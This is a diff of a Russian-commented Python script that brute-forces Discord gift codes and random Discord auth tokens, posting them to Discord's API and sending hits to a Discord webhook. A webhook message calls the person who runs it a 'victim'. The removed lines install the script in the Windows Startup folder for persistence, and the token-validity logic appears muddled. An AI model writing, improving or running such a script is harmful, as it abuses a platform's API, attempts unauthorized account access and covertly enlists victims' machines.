@@ -1,19 +1,27 @@
-# _               _     _ 
-#| |             | |   | |
-#| |__   __ _  __| | __| |
-#| '_ \ / _` |/ _` |/ _` |
-#| |_) | (_| | (_| | (_| |
-#|_.__/ \__,_|\__,_|\__,_|
+#         _    __   _   
+#  __ _  (_)  / _| | |_ 
+# / _` | | | |  _| |  _|
+# \__, | |_| |_|    \__|
+# |___/                 
+#                 _                    
+#  _ __    __ _  (_)  _ _    ___   _ _ 
+# | '  \  / _` | | | | ' \  / -_) | '_|
+# |_|_|_| \__,_| |_| |_||_| \___| |_|  
+                                      
 
-URLWEBHOOK = "link"
+#badd
 
-from ast import Expression
+
+URLWEBHOOK = "URL"
+
 import random
 import string
+from unittest import expectedFailure
 import requests
 import os, sys
 
-
+from random import randint
+from requests import get, post
 from discord_webhook import DiscordWebhook
 
 
@@ -23,42 +31,63 @@ def main(URLWEBHOOK):
 	Thisfile_name = os.path.basename(Thisfile) # Название файла без пути
 	user_path = os.path.expanduser('~') # Путь к папке пользователя
 
-	if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
-		os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
-		print(f'{Thisfile_name} добавлен в автозагрузку')
+	#if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
+		#os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
+	
+	
 	try:
-		webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'Жертва запустила')
-		response = webhook.execute()
-
 		i = 0
 		valid = 0
 		novalid = 0
 
 		it = 0
 		tvalid = 0
-		nvalid = 0
+		tnovalid = 0
+
+		webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'Жертва запустила гифт майнер')
+		response = webhook.execute()
 
 		while True:
-			i += 1
-			code = "".join(random.choices(
-			string.ascii_uppercase + string.digits + string.ascii_lowercase,
-			k = 16
-		))
 
+
+			it +=1
+			TokenChars = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbm0123456789-_"
+						
+
+
+			one = ''.join((random.choice(TokenChars) for i in range(24)))
+			two = ''.join((random.choice(TokenChars) for i in range(6)))
+			three = ''.join((random.choice(TokenChars) for i in range(27)))
+
+			token = f"{one}.{two}.{three}"
+
+			response = post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
+
+			if response.status_code == 401:
+				webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'|{token}| - valid | Invalid - |{it}|')
+				response = webhook.execute()
+			elif "You need to verify your account in order to perform this action." in str(response.content):
+				it += 1
+			else:
+				it += 1
+
+			code = "".join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase,k = 16))
+						
 			nitro = "https://discord.gift/" + code
 			r = requests.get(f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true")
 
-			if r.status_code == 404:
-				continue
-				novalid += 1
+			i += 1
+
 			if r.status_code == 200:
 				webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'{nitro}')
 				response = webhook.execute()
-				valid += 1
-			elif i == 10000: #можете указать когда он будет присылать сообщения с данными
-				webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'10000 {valid} - valid | {novalid} - InValid')
+				tvalid += 1
+			else:
+				tnovalid += 1
+				continue
+			if i == 10000:
+				webhook = DiscordWebhook(url=f'{URLWEBHOOK}', content=f'из {i} - {novalid} Invalid | {valid} Valid')
 				response = webhook.execute()
-			
 	except:
 		print(0/0)
 
